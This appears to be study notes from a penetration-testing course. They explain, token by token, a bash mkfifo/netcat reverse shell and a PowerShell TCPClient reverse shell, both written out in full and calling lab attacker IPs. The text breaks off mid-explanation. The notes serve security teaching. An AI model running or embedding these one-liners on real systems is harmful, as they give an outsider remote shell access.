- When we are sending a message to another user, that information within that message is called the payload. This is a part of the packets payload.
- When working with a payload, we must remind ourselves that we are talking about the code or malicious code that is sent over to the target.
- Let’s breakdown the code we used in the last section:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

rm -f /tmp/f;

- This is forcing the removal of /tmp/f if it exists.

mkfifo /tmp/f;

- Makes a FIFO named Pipe file at the location /tmp/f.

cat /tmp/f |

- Concatenates the FIFO named pipe file /tmp/f, the pipe then connects the standard output of the command cat /tmp/f and uses it as input for the command after the pipe character.

/bin/bash -i 2>&1 |

- Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures that stderr data stream and stdout data stream are redirected to the command following the pipe.

nc 10.10.14.12 7777 > /tmp/f

- Uses netcat to send a connection to our attack box 10.10.14.12 listening on port 7777. The output will be redirected to /tmp/f, serving the bash shell to our waiting netcat listener.

**Powershell One Liner Explained:**

`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

powershell -nop -c

- Executes powershell.exe with no profile (-nop) and executes the command/script block (-c) contained in quotes.

“$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);

- Sets/evaluates the variable $client which will be equal to New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework will then connect with the TCP socket listed in parenthesis.

$stream = $client.GetStream();

- Set/evaluates the variable $stream equal to the $client variable and the .NET framework method called GetStream that facilitates network communications.

[byte[]]$bytes = 0..65535|%{0};

- Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array.

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)

- Starts a while loop containing the variable $i set equal to the .NET framework Stream.Read. The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.

{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);